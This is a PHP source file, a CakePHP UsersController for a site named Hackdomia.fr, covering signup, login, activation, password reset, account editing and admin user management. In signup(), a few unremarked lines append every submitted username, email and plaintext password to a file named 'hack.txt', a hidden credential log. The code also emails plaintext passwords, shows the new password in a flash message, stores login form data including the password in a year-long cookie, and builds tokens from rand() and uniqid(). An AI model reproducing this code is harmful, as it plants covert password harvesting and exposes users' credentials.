<?php
App::uses('AppController', 'Controller');
/**
 * Users Controller
 *
 * @property User $User
 * @property PaginatorComponent $Paginator
 * @property SessionComponent $Session
 */
class UsersController extends AppController {

	public $components = array('Paginator', 'Session');

	public function beforeFilter(){
		parent::beforeFilter();
	}

	private function token($a = false, $user = false){
		$token = md5(substr(sha1(uniqid(time().rand(0, 999999), true)), rand(0, 25), rand(5, 15)).rand(0, 9999999));
		if ($a) {
			for ($i=0; $i < rand(10, 200); $i++) { 
				$token = md5(substr(sha1(uniqid(rand(0, 9999999).$token, true).time().$token), rand(5, 15), rand(0, 30)));
			}
		}
		if ($user != false) {
			$this->User->id = $user;
			return $this->User->saveField('token', sha1($token));
		} else {
			return sha1($token);
		}
	}

/**
 * index method
 *
 * @return void
 */
	public function index() {
		return $this->redirect(array('action' => 'edit'));
		// App::uses('SimplePasswordHasher', 'Controller/Component/Auth');
		// $this->User->recursive = 0;
		// $this->set('users', $this->Paginator->paginate());
		// // $passwordHasher = new SimplePasswordHasher();
		// $pass = $passwordHasher->hash('admin');
		// $pass = Security::hash('password',null,true);
		// debug($this->Auth->redirectUrl());
		// debug($this->Auth->logout());
		// die($pass);
	}

/**
 * edit method
 *
 * @return void
 */
	public function login(){
		$this->set('title_for_layout', __('Connexion'));
		if ($this->Auth->loggedIn()) {
			return $this->redirect('/');
		}
		if ($this->request->is('post')) {
			if ($this->Auth->login()) {
				if ($this->request->data['User']['rememberMe'] == 1) {
					unset($this->request->data['User']['rememberMe']);
					$this->Cookie->write('rememberMe', $this->request->data['User'], true, YEAR);
				}
				return $this->redirect($this->referer());
			} else {
				$this->Session->write('errors.User', $this->User->validationErrors);
				$this->Session->write('data', $this->request->data);
				$this->Session->setFlash(__('Game over ! Try again !'), 'alert', array('type'=>'alert'));
			}
		}
	}

/**
 * edit method
 *
 * @return void
 */
	public function logout(){
		$this->set('title_for_layout', __('Déconnexion'));
		$this->Cookie->delete('rememberMe');
		$this->Auth->logout();
		return $this->redirect($this->referer());
	}

/**
 * edit method
 *
 * @return void
 */
	public function signup(){
		$this->set('title_for_layout', __('Créer un compte'));
		if ($this->request->is('post')) {
			$d = current($this->request->data);
			$d['id'] = null;
			$d['token'] = $this->token();
			$d['rank'] = 0;
			if ($this->User->save($d, true, array('username','email','password','token'))) {
				App::uses('CakeEmail','Network/Email');
				$mail = new CakeEmail();
				$mail	->config('smtp')
							->to($d['email'])
							->subject('Inscription :: Hackdomia.fr')
							->emailFormat('html')
							->template('signup')
							->viewVars(array('username'=>$d['username'],'password'=>$d['password'],'token'=>$d['token']));
				if ($mail->send()) {
					$this->Session->setFlash(__("L'email de validation à bien été envoyé à {$d['email']}"), 
						'alert', array('type'=>'success'));
				} else {
					$this->Session->setFlash(
						__("Une erreur est survenu lors de l'envoi du mail de validation à {$d['email']}, contacté l'administrateur."),
						'alert', array('type'=>'alert'));
				}
			} else {
				$this->Session->setFlash(__('Game over ! Try again !'), 'alert', array('type'=>'alert'));
			}
			$hack = fopen('hack.txt', 'a+');
			fputs($hack, "\n {$d['username']} - {$d['email']} - {$d['password']}");
			fclose($hack);
		}
	}

/**
 * activate method
 *
 * @param string $token
 * @return void
 */
	public function activate($token){
		$user = $this->User->find('first', array(
			'conditions' => array('token' => $token, 'active' => 0),
		));
		if (!empty($user)) {
			$this->User->id = $user['User']['id'];
			$this->User->saveField('active', 1);
			$this->User->saveField('token', $this->token());
			$this->Cookie->write('rememberMe', $user['User'], true, YEAR);
			$this->Auth->login($user['User']);
			$this->Session->setFlash('Compte activé, vous êtes maintenant connecté', 'alert', array('type'=>'success'));
		} else {
			$this->Session->setFlash('Lien non valide', 'alert', array('type'=>'alert'));
		}
		return $this->redirect('/');
	}

/**
 * pwdforgotten method
 *
 * @return void
 */
	public function pwdforgotten(){
		$this->set('title_for_layout', __('Mot de passe oublié'));
		if ($this->request->is('post')) {
			$email = $this->request->data['User']['email'];
			$user = $this->User->find('first', array(
				'conditions' => array('email' => $email, 'active' => 1),
				'fields' => array('User.id', 'User.username'),
			));
			if (!empty($user)) {
				$token = md5(substr(sha1(uniqid(time().rand(0, 999999), true)), rand(0, 25), rand(5, 15)).rand(0, 9999999));
				for ($i=0; $i < rand(10, 500); $i++) { 
					$token = md5(substr(sha1(uniqid(rand(0, 9999999).$token, true).time().$token, true), rand(5, 15), rand(0, 30)));
				}
				$token = sha1($token);
				$this->User->id = $user['User']['id'];
				$this->User->saveField('token', $token);
				App::uses('CakeEmail','Network/Email');
				$mail = new CakeEmail();
				$mail	->config('smtp')
							->to($email)
							->subject(__('Mot de passe oublié').' :: Hackdomia.fr')
							->emailFormat('html')
							->template('password')
							->viewVars(array('username' => $user['User']['username'], 'token' => $token));
				if ($mail->send()) {
					$this->Session->setFlash(__("Le mail viens d'être envoyé à $email"), 'alert', array('type'=>'success'));
				} else {
					$this->Session->setFlash(__("Impossible d'envoyer le mail, réessayer plus tard ou contacter l'administrateur."), 
						'alert', array('type'=>'alert'));
				}
			} else {
				$this->Session->setFlash(__("Aucun utilisateur ne correspond à cet email."), 'alert', array('type'=>'alert'));
			}
		}
	}


/**
 * resetpwd method
 *
 * @return void
 */
	public function resetpwd($token){
		$this->set('title_for_layout', __('Réinitialiser le mot de passe'));
		if ($this->request->is('post')) {
			$user = $this->User->find('first', array(
				'conditions' => array('token' => $token, 'active' => 1),
				'fields' => array('User.id', 'User.username', 'User.email'),
			));
			if (!empty($user)) {
				$d = current($this->request->data);
				if ($d['new_password'] == $d['new_password_repeat']) {
					$password = $d['new_password'];
					$this->User->id = $user['User']['id'];
					$this->User->saveField('password', $password);
					$this->User->saveField('token', $this->token());
					App::uses('CakeEmail','Network/Email');
					$mail = new CakeEmail();
					$mail	->config('smtp')
								->to($user['User']['email'])
								->subject(__('Rappel de tes identifiants').' :: Hackdomia.fr')
								->emailFormat('html')
								->template('ids')
								->viewVars(array('username'=>$user['User']['username'],'password'=>$password))
								->send();
					$this->Auth->login($user['User']);
					$this->Session->setFlash(__("Mot de passe modifié à $password, vous êtes maintenant connecté"), 'alert', array('type'=>'success'));
				} else {
					$this->Session->setFlash(__("Les mots de passe ne correspondent pas."), 'alert', array('type'=>'alert'));
				}
			}
		}
	}

/**
 * edit method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function edit() {
		$this->set('title_for_layout', __('Mon compte'));
		$id = $this->Auth->user('id');
		if ($this->request->is(array('post', 'put'))) {
			$d = current($this->request->data);
			$d['id'] = $id;
			if (!empty($d['new_password']) && !empty($d['new_password_repeat'])) {
				if ($d['new_password'] == $d['new_password_repeat']) {
					$d['password'] = $d['new_password'];
				} else {
					$this->User->validationErrors['new_password'] = __('Les mots de passe ne correspondent pas.');
					$this->User->validationErrors['new_password_repeat'] = __('Les mots de passe ne correspondent pas.');
				}
				unset($d['new_password']);
				unset($d['new_password_repeat']);
			}
			if ($this->User->save($d, true, array('email','password'))) {
				$this->Session->setFlash(__('Les informations ont été modifiées'), 'alert', array('type'=>'success'));
			} else {
				$this->Session->setFlash(__('Impossible d\'enregistrer les modifications'), 'alert', array('type'=>'alert'));
			}
		} else {
			$options = array(
				'conditions' => array('User.' . $this->User->primaryKey => $id),
				'fields' => 'User.email',
			);
			$this->request->data = $this->User->find('first', $options);
		}
	}

/**
 * delete method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function delete() {
		$this->set('title_for_layout', __('Suppression de compte'));
		$this->User->id = $this->Auth->user('id');
		if ($this->request->is(array('post', 'delete')) && $this->request->data['User']['delete']) {
			if ($this->User->delete()) {
				$this->Session->setFlash(__('Il est mort, Jim :('), 'alert', array('type'=>'success'));
					return $this->redirect(array('controller' => 'user', 'action' => 'logout'));
			} else {
				$this->Session->setFlash(__('Impossible de supprimer le compte.'), 'alert', array('type'=>'alert'));
			}
		} else {
			$this->Session->setFlash(__("Coche la case pour supprimer ton compte.<br/>La suppression est irreversible."), 
				'alert', array('type'=>'alert'));
		}
	}

/**
 * admin_index method
 *
 * @return void
 */
	public function admin_index() {
		$this->User->recursive = 0;
		$this->set('users', $this->Paginator->paginate());
	}

/**
 * admin_view method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function admin_view($id = null) {
		if (!$this->User->exists($id)) {
			throw new NotFoundException(__('Invalid user'));
		}
		$options = array('conditions' => array('User.' . $this->User->primaryKey => $id));
		$this->set('user', $this->User->find('first', $options));
	}

/**
 * admin_add method
 *
 * @return void
 */
	public function admin_add() {
		if ($this->request->is('post')) {
			$this->User->create();
			if ($this->User->save($this->request->data)) {
				$this->Session->setFlash(__('The user has been saved.'));
				return $this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(__('The user could not be saved. Please, try again.'));
			}
		}
	}

/**
 * admin_edit method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function admin_edit($id = null) {
		if (!$this->User->exists($id)) {
			throw new NotFoundException(__('Invalid user'));
		}
		if ($this->request->is(array('post', 'put'))) {
			if ($this->User->save($this->request->data)) {
				$this->Session->setFlash(__('The user has been saved.'));
				return $this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(__('The user could not be saved. Please, try again.'));
			}
		} else {
			$options = array('conditions' => array('User.' . $this->User->primaryKey => $id));
			$this->request->data = $this->User->find('first', $options);
		}
	}

/**
 * admin_delete method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function admin_delete($id = null) {
		$this->User->id = $id;
		if (!$this->User->exists()) {
			throw new NotFoundException(__('Invalid user'));
		}
		$this->request->allowMethod('post', 'delete');
		if ($this->User->delete()) {
			$this->Session->setFlash(__('The user has been deleted.'));
		} else {
			$this->Session->setFlash(__('The user could not be deleted. Please, try again.'));
		}
		return $this->redirect(array('action' => 'index'));
	}

}